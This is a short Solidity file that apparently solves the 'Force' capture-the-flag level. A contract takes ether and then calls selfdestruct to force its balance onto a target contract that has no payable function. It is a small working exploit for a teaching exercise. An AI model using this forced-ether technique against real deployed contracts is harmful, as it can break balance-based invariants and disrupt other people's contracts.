// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {}

contract destroyRobot {
    constructor() payable {}

    function killself(Force force) public {
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}
}
